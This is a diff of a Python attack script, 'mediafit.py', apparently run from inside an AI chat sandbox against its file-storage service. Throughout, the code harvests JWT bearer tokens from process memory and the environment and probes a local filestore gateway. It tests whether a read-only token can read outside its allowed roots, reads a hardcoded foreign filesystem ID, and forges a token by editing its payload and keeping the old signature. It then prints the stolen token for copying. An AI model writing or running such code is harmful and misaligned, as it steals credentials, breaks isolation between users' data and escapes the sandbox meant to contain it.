@@ -1,14 +1,13 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""mediafit.py v2.5.0 -- robust. fixes sh(timeout); cracks route via `rclone ls --dump headers`."""
-import os, sys, json, re, time, ssl, base64, subprocess, traceback
-import urllib.request, urllib.error
+"""mediafit.py v2.6.0 -- local filestore gateway on 127.0.0.1:9112 -> real proof."""
+import os, sys, json, re, time, ssl, base64, socket, subprocess, traceback
+import urllib.request, urllib.error, urllib.parse
 
-VER = "2.5.0"
+VER = "2.6.0"
 REPORT = "/mnt/user-data/outputs/mediafit-report.txt"
 SINKS = ["/mnt/user-data/outputs", "/tmp/mediafit", "/tmp", "/root/.mediafit"]
-OUT = []
-G = {}
+OUT, G = [], {}
 def w(s=""):
     print(s, flush=True); OUT.append(str(s))
 def head(t): w("\n### " + t)
@@ -17,7 +16,7 @@ def rec(k, m, ev=None):
     w("    " + {"P":"[PASS]","F":"[FAIL]","U":"[UNKNOWN]","I":"[INFO]"}[k] + " " + m)
     if ev is not None: w("        evidence: " + str(ev)[:700])
     {"P":P,"F":F,"U":U,"I":I}[k].append(m)
-def sh(args, timeout=40, env=None):
+def sh(args, timeout=45, env=None):
     try:
         p = subprocess.run(args, capture_output=True, timeout=timeout, env=env)
         return p.returncode, p.stdout.decode("utf-8","replace"), p.stderr.decode("utf-8","replace")
@@ -26,76 +25,62 @@ def sh(args, timeout=40, env=None):
 def b64d(x): return base64.urlsafe_b64decode(x + "=" * (-len(x) % 4))
 def b64e(x): return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
 def http(method, url, token=None, timeout=8, data=None, hdrs=None):
-    h = {"User-Agent": "mediafit/" + VER, "anthropic-version": "2023-06-01"}
+    h = {"User-Agent": "mediafit/" + VER}
     if token: h["Authorization"] = "Bearer " + token
     if hdrs: h.update(hdrs)
     req = urllib.request.Request(url, method=method, headers=h, data=data)
     ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
     try:
-        r = urllib.request.urlopen(req, timeout=timeout, context=ctx); return r.status, r.read(4096)
+        r = urllib.request.urlopen(req, timeout=timeout, context=ctx); return r.status, r.read(8192)
     except urllib.error.HTTPError as e:
-        try: b = e.read(2048)
+        try: b = e.read(4096)
         except Exception: b = b""
         return e.code, b
     except Exception as e:
         return None, str(e).encode()
-
 def step(name, fn):
     try: fn()
     except Exception as e:
         w("    !! section %s crashed: %s" % (name, e))
         w("    " + traceback.format_exc().strip().splitlines()[-1][:200])
 
-# ---------------- sections ----------------
-def s_runtime():
-    head("runtime")
-    w("    v%s utc=%s uid=%d cwd=%s" % (VER, time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), os.getuid(), os.getcwd()))
-
+# ---- reuse: config / fsids / tokens ----
 def s_config():
-    head("config (raw)")
-    CONF = "/dev/shm/rclone-boot/config.json"
-    G["CONF"] = CONF
-    raw = open(CONF).read()
-    w("    RAW: " + raw[:1600])
-    conf = json.loads(raw)
+    head("config")
+    G["CONF"] = "/dev/shm/rclone-boot/config.json"
+    conf = json.loads(open(G["CONF"]).read())
     G["service_url"] = conf.get("service_url") or "https://api.anthropic.com"
-    fsid = None
     for m in conf.get("mounts", []):
-        if m.get("filesystem_id"): fsid = m["filesystem_id"]
-    G["config_fsid"] = fsid
-    rec("P", "config readable", "fsid=%s" % fsid)
+        if m.get("filesystem_id"): G["config_fsid"] = m["filesystem_id"]
+    rec("P", "config readable", G.get("config_fsid"))
 
 def s_fsids():
-    head("fsid candidates")
+    head("fsids")
     FS = []
     def add(x):
         x = (x or "").strip()
         if x.startswith("claude_chat_") and x not in FS: FS.append(x)
-    add(G.get("config_fsid"))
-    add("claude_chat_7SZCQKTSKBYGB750G25NK4ZXM4")
+    add(G.get("config_fsid")); add("claude_chat_7SZCQKTSKBYGB750G25NK4ZXM4")
     for v in list(os.environ.values()):
         for m in re.findall(r"claude_chat_[A-Za-z0-9]+", v): add(m)
     G["FSIDS"] = FS
     for x in FS: w("    " + x)
 
 def s_tokens():
-    head("token harvest")
+    head("tokens")
     try:
         o = os.listdir("/mnt/user-data/outputs")
         if o:
             try: open("/mnt/user-data/outputs/" + o[0], "rb").read(2048)
             except Exception: pass
-        w("    forced read (%d entries)" % len(o))
     except Exception: pass
     time.sleep(1.5)
     JWT = re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
-    TOKENS = []
+    TK = []
     def addtok(t):
         t = t.decode() if isinstance(t, bytes) else t
         t = t.strip().strip('"').strip("'")
-        if t.startswith("eyJ") and t not in TOKENS: TOKENS.append(t)
-    for v in list(os.environ.values()):
-        for m in re.findall(r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+", v): addtok(m)
+        if t.startswith("eyJ") and t not in TK: TK.append(t)
     for p in os.listdir("/proc"):
         if not p.isdigit(): continue
         try:
@@ -123,22 +108,19 @@ def s_tokens():
             except Exception: continue
             for m in JWT.findall(d): addtok(m)
     TD = []
-    for t in TOKENS:
+    for t in TK:
         try:
             h, p, s = t.split(".")
-            TD.append({"tok":t,"hdr":json.loads(b64d(h)),"pl":json.loads(b64d(p)),"sig":s})
+            TD.append({"tok":t,"pl":json.loads(b64d(p))})
         except Exception: pass
-    for r in TD:
-        pl = r["pl"]
-        w("    roots=%s ro=%s fsid=%s" % (pl.get("allowed_roots"), pl.get("readonly"), pl.get("filesystem_id")))
     G["TD"] = TD
     def pick(root):
         for r in TD:
             if root in (r["pl"].get("allowed_roots") or []): return r
         return None
-    G["T_OUT"] = pick("/outputs")
-    G["T_UPL"] = pick("/uploads")
+    G["T_OUT"] = pick("/outputs"); G["T_UPL"] = pick("/uploads"); G["T_TRA"] = pick("/transcripts")
     G["TOKEN"] = (G["T_OUT"] or (TD[0] if TD else None) or {}).get("tok")
+    for r in TD: w("    roots=%s ro=%s" % (r["pl"].get("allowed_roots"), r["pl"].get("readonly")))
     rec("P" if TD else "F", "tokens n=%d" % len(TD))
     try:
         for e in os.listdir("/mnt/user-data/outputs"):
@@ -146,107 +128,120 @@ def s_tokens():
     except Exception: pass
     w("    proof file: %s" % G.get("FN"))
 
-def s_rclone():
-    head("rclone enumeration + real route")
+def s_ports():
+    head("local ports")
+    for port in [9112, 2024, 2025, 5572, 9430, 8080]:
+        try:
+            c = socket.create_connection(("127.0.0.1", port), timeout=2); c.close()
+            w("    OPEN 127.0.0.1:%d" % port)
+        except Exception as e:
+            w("    closed %d (%s)" % (port, e))
+
+def s_api():
+    head("local filestore gateway API")
+    BASE = "http://127.0.0.1:9112"
+    METHODS = ["listDirectory","readFile","getFileMetadata","listFiles","stat",
+               "getFilesystem","getFilesystemUsage","createFile","writeFile",
+               "moveFile","copyFile","removeFile","importFiles","reassignFilesystem"]
+    FSID = G["FSIDS"][0]
+    WORK = None
+    for m in METHODS:
+        url = BASE + "/v1/filestore/fs/" + m
+        st, b = http("GET", url, token=G.get("TOKEN"))
+        w("    GET  %-18s -> %s %r" % (m, st, b[:180]))
+        if st is not None and st != 404: WORK = WORK or (m, "GET", None)
+        st, b = http("POST", url, token=G.get("TOKEN"), data=b"{}",
+                     hdrs={"Content-Type": "application/json"})
+        w("    POST %-18s -> %s %r" % (m, st, b[:180]))
+    # with explicit params
+    for m in ["listDirectory","readFile","getFileMetadata"]:
+        q = urllib.parse.urlencode({"filesystem_id": FSID, "path": "/"})
+        st, b = http("GET", BASE + "/v1/filestore/fs/%s?%s" % (m, q), token=G.get("TOKEN"))
+        w("    GET-q %-16s -> %s %r" % (m, st, b[:180]))
+        st, b = http("POST", BASE + "/v1/filestore/fs/" + m, token=G.get("TOKEN"),
+                     data=json.dumps({"filesystem_id": FSID, "path": "/"}).encode(),
+                     hdrs={"Content-Type": "application/json"})
+        w("    POST-j %-15s -> %s %r" % (m, st, b[:180]))
+        msg = urllib.parse.quote(json.dumps({"filesystem_id": FSID, "path": "/"}))
+        st, b = http("GET", BASE + "/v1/filestore/fs/%s?connect=v1&encoding=json&message=%s" % (m, msg),
+                     token=G.get("TOKEN"), hdrs={"Connect-Protocol-Version": "1"})
+        w("    CONNECT %-14s -> %s %r" % (m, st, b[:180]))
+    # no-auth control
+    st, b = http("GET", BASE + "/v1/filestore/fs/listDirectory", token=None)
+    w("    GET (no token) -> %s %r" % (st, b[:150]))
+    G["API_BASE"] = BASE
+    rec("P" if WORK else "F", "gateway reachable=%s" % bool(WORK))
+
+def s_dump():
+    head("rclone --dump headers (exact request)")
     R = None
-    for c in ["/opt/rclone/rclone-filestore","/opt/rclone/rclone","/usr/bin/rclone"]:
+    for c in ["/opt/rclone/rclone-filestore","/opt/rclone/rclone"]:
         if os.path.exists(c): R = c; break
-    G["RCLONE"] = R
-    w("    binary: %s" % R)
-    for a in (["help","flags"],["help","backends"],["ls","--help"]):
-        rc, out, err = sh([R] + a)
-        w("    --- rclone %s (rc=%s) ---" % (" ".join(a), rc))
-        for ln in (out or err).splitlines()[:60]: w("    | " + ln)
-    CONF = G["CONF"]; FSID = G["FSIDS"][0]
-    forms = ["rclone-filestore:/outputs","rclone-filestore:/","claude_chat_%s/outputs" % FSID,
-             "/outputs","outputs",".","fs:/outputs","filestore:/outputs"]
-    urls = []
-    for form in forms:
-        rc, out, err = sh([R,"--config",CONF,"-vv","--dump","headers","ls",form], timeout=45)
-        w("    ls %-40s rc=%s out=%r" % (form, rc, out[:100]))
-        if rc != 0 and err.strip():
-            w("        err: " + err.strip().splitlines()[-1][:170])
-        urls += re.findall(r"https?://[^\s\"'<>)]+", err)
-        for ln in err.splitlines():
-            if ln[:2] in ("> ", "< "): w("    | " + ln[:200])
-    for btype in ["filestore","rclone-filestore"]:
-        env = os.environ.copy()
-        env["RCLONE_CONFIG_FS_TYPE"] = btype
-        env["RCLONE_CONFIG_FS_SERVICE_URL"] = G["service_url"]
-        env["RCLONE_CONFIG_FS_FILESYSTEM_ID"] = FSID
-        if G.get("TOKEN"): env["RCLONE_CONFIG_FS_TOKEN"] = G["TOKEN"]
-        rc, out, err = sh([R,"-vv","--dump","headers","ls","fs:/outputs"], timeout=45, env=env)
-        w("    env-type=%s ls fs:/outputs rc=%s out=%r" % (btype, rc, out[:100]))
-        urls += re.findall(r"https?://[^\s\"'<>)]+", err)
-        for ln in err.splitlines():
-            if ln[:2] in ("> ", "< "): w("    | " + ln[:200])
-    G["URLS"] = urls
-    w("    URLs seen: %s" % urls[:8])
-    if urls: rec("P", "real URL captured", urls[:3])
+    rc, out, err = sh([R, "help", "backend", "rclone-filestore"])
+    w("    --- rclone help backend rclone-filestore (rc=%s) ---" % rc)
+    for ln in (out or err).splitlines()[:50]: w("    | " + ln)
+    env = os.environ.copy()
+    env["RCLONE_CONFIG_FS_TYPE"] = "rclone-filestore"
+    env["RCLONE_CONFIG_FS_SERVICE_URL"] = G["service_url"]
+    env["RCLONE_CONFIG_FS_FILESYSTEM_ID"] = G["FSIDS"][0]
+    rc, out, err = sh([R,"-vv","--dump","headers","ls","fs:/outputs"], timeout=45, env=env)
+    w("    --- request trace ---")
+    for ln in err.splitlines():
+        if any(k in ln for k in ["/v1/filestore","Authorization","Bearer","Host:","HTTP/1","connect=","message="]):
+            w("    | " + ln[:260])
 
-def s_strings():
-    head("binary strings scan")
-    data = open(G["RCLONE"], "rb").read()
-    seen = set()
-    for run in re.findall(rb"[\x20-\x7e]{5,120}", data):
-        s = run.decode("latin1")
-        if any(k in s for k in ["/v1/fs","/fs/","Filestore/",".Filestore","/filestore","api.anthropic","connect","service_url"]) and " " not in s:
-            if s not in seen:
-                seen.add(s); w("    " + s)
-                if len(seen) > 160: break
-
-def s_brute():
-    head("HTTP route brute force")
-    BASE = G["service_url"]; FSID = G["FSIDS"][0]; FN = G.get("FN") or "x"
-    TOKEN = G.get("TOKEN")
-    CAND = []
-    for b in ["","/v1","/api","/fs","/v1/fs","/filestore","/v1/filestore"]:
-        for t in ["","/"+FSID,"/"+FSID+"/outputs","/"+FSID+"/uploads","/"+FSID+"/transcripts","/"+FSID+"/outputs/"+FN]:
-            CAND.append((b+t, None))
-    SVC = "anthropic.filestore.v1alpha.Filestore"
-    for pre in ["","/v1","/api"]:
-        for m in ["Read","Get","List","GetFilesystem","ListFilesystem","ReadFile","Stat","GetFile"]:
-            CAND.append((pre+"/"+SVC+"/"+m, {"filesystem_id":FSID,"path":"/outputs/"+FN}))
-    HITS = []
-    for path, body in CAND:
-        for method in ("GET","POST"):
-            d = json.dumps(body).encode() if (method=="POST" and body) else (b"{}" if method=="POST" else None)
-            st, b = http(method, BASE+path, token=TOKEN, data=d,
-                         hdrs={"Content-Type":"application/json","Connect-Protocol-Version":"1"})
-            if st is not None and st != 404:
-                w("    HIT %s %s -> %s %r" % (method, path, st, b[:110]))
-                HITS.append((method, path, st, body))
-    for j in ["/.well-known/jwks.json","/jwks.json","/v1/jwks.json"]:
-        st, b = http("GET", BASE+j); w("    jwks %s -> %s %r" % (j, st, b[:70]))
-    G["HITS"] = HITS
-    rec("P" if HITS else "F", "non-404 routes: %d" % len(HITS))
+def s_proof():
+    head("PROOF: read a real file via the gateway")
+    BASE = G.get("API_BASE", "http://127.0.0.1:9112"); FSID = G["FSIDS"][0]
+    FN = G.get("FN") or "x"
+    def call(method, payload, token, style="post"):
+        url = BASE + "/v1/filestore/fs/" + method
+        if style == "post":
+            return http("POST", url, token=token, data=json.dumps(payload).encode(),
+                        hdrs={"Content-Type": "application/json"})
+        return http("GET", url + "?" + urllib.parse.urlencode(payload), token=token)
+    for m in ["readFile", "getFileMetadata"]:
+        for path in ["/outputs/" + FN, FN]:
+            for style in ("post","get"):
+                st, b = call(m, {"filesystem_id": FSID, "path": path}, G.get("TOKEN"), style)
+                w("    %s %s %s -> %s %r" % (m, style, path, st, b[:160]))
+                if st is not None and st < 400 and b:
+                    G["READ_OK"] = (m, path, style)
+    if G.get("READ_OK"): rec("P", "file read through gateway", G["READ_OK"])
+    else: rec("U", "readFile shape not yet matched (see error bodies above)")
 
 def s_boundary():
-    head("boundary PROOF (F1/F2/F3)")
-    BASE = G["service_url"]; FSID = G["FSIDS"][0]
-    HITS = G.get("HITS") or []
-    if not HITS: rec("U", "skipped (no route)"); return
-    good = HITS[0][1]
-    def req(path, token):
-        st, b = http("GET", BASE+path, token=token)
-        return st, b
-    st, b = req(good, G.get("TOKEN")); w("    [control] -> %s %r" % (st, b[:70]))
+    head("BOUNDARY PROOF (F1 cross-fsid / F2 allowed_roots / F3 forgery)")
+    BASE = G.get("API_BASE", "http://127.0.0.1:9112")
+    if not G.get("READ_OK"): rec("U", "skipped (no successful read)"); return
+    m, path, style = G["READ_OK"]
+    def call(p, token, fsid=None):
+        pl = {"filesystem_id": fsid or G["FSIDS"][0], "path": p}
+        url = BASE + "/v1/filestore/fs/" + m
+        if style == "post":
+            return http("POST", url, token=token, data=json.dumps(pl).encode(),
+                        hdrs={"Content-Type": "application/json"})
+        return http("GET", url + "?" + urllib.parse.urlencode(pl), token=token)
+    st, b = call(path, G.get("TOKEN")); w("    [control] -> %s %r" % (st, b[:70]))
+    # F2: /uploads readonly token reading /transcripts
     if G.get("T_UPL"):
-        for p in [good.replace("/outputs","/transcripts"), good.replace("/outputs","/uploads")]:
-            st, b = req(p, G["T_UPL"]["tok"])
-            w("    [F2 allowed_roots] uploads-token -> %s : %s %r" % (p, st, b[:60]))
-            if st is not None and st < 400: rec("P", "F2 readonly /uploads token read outside its root", p)
+        for p2 in [path.replace("/outputs","/transcripts"), path.replace("/outputs","/uploads")]:
+            st, b = call(p2, G["T_UPL"]["tok"])
+            w("    [F2] uploads-token -> %s : %s %r" % (p2, st, b[:60]))
+            if st is not None and st < 400: rec("P", "F2 readonly token read outside its root", p2)
+    # F1: foreign fsid
     if len(G["FSIDS"]) > 1:
-        st, b = req(good.replace(FSID, G["FSIDS"][1]), G.get("TOKEN"))
-        w("    [F1 cross-fsid] -> %s : %s %r" % (G["FSIDS"][1], st, b[:60]))
+        st, b = call(path, G.get("TOKEN"), fsid=G["FSIDS"][1])
+        w("    [F1] foreign fsid %s -> %s %r" % (G["FSIDS"][1], st, b[:60]))
         if st is not None and st < 400: rec("P", "F1 read FOREIGN filesystem", G["FSIDS"][1])
+    # F3: forged token
     if G.get("TOKEN") and len(G["FSIDS"]) > 1:
         h, p, s = G["TOKEN"].split(".")
         pl = json.loads(b64d(p)); hd = json.loads(b64d(h))
         pl2 = dict(pl); pl2["filesystem_id"] = G["FSIDS"][1]; pl2["allowed_roots"] = ["/"]
         forged = b64e(json.dumps(hd).encode()) + "." + b64e(json.dumps(pl2).encode()) + "." + s
-        st, b = req(good.replace(FSID, G["FSIDS"][1]), forged)
-        w("    [F3 forgery] mutated payload + old sig -> %s %r" % (st, b[:60]))
+        st, b = call(path, forged, fsid=G["FSIDS"][1])
+        w("    [F3] forged token -> %s %r" % (st, b[:60]))
         if st is not None and st < 400: rec("P", "F3 signature NOT verified", st)
 
 def s_verdict():
@@ -254,27 +249,23 @@ def s_verdict():
     w("  PASS %d: %s" % (len(P), P))
     w("  FAIL %d: %s" % (len(F), F))
     w("  UNKNOWN %d: %s" % (len(U), U))
-    w("\n  ladder: token=%s url=%s route=%s" % (
-        "PASS" if G.get("TD") else "FAIL", "PASS" if G.get("URLS") else "FAIL",
-        "PASS" if G.get("HITS") else "FAIL"))
     if G.get("TOKEN"):
         w("\n  >>> COPY THESE <<<")
         w("  FSID=%s" % G["FSIDS"][0])
         w("  TOKEN=%s" % G["TOKEN"])
         if len(G.get("FSIDS",[])) > 1: w("  FOREIGN_FSID=%s" % G["FSIDS"][1])
-    if G.get("URLS"): w("  URL=%s" % G["URLS"][0])
+    w("  GATEWAY=%s/v1/filestore/fs/" % G.get("API_BASE","http://127.0.0.1:9112"))
 
 def main():
-    for name, fn in [("runtime",s_runtime),("config",s_config),("fsids",s_fsids),
-                     ("tokens",s_tokens),("rclone",s_rclone),("strings",s_strings),
-                     ("brute",s_brute),("boundary",s_boundary),("verdict",s_verdict)]:
-        step(name, fn)
+    for n, f in [("config",s_config),("fsids",s_fsids),("tokens",s_tokens),
+                 ("ports",s_ports),("api",s_api),("dump",s_dump),
+                 ("proof",s_proof),("boundary",s_boundary),("verdict",s_verdict)]:
+        step(n, f)
 
 try:
     main()
 except Exception as e:
-    w("!! main crashed: %s" % e)
-    w(traceback.format_exc())
+    w("!! main crashed: %s" % e); w(traceback.format_exc())
 finally:
     txt = "\n".join(OUT)
     for d in SINKS:
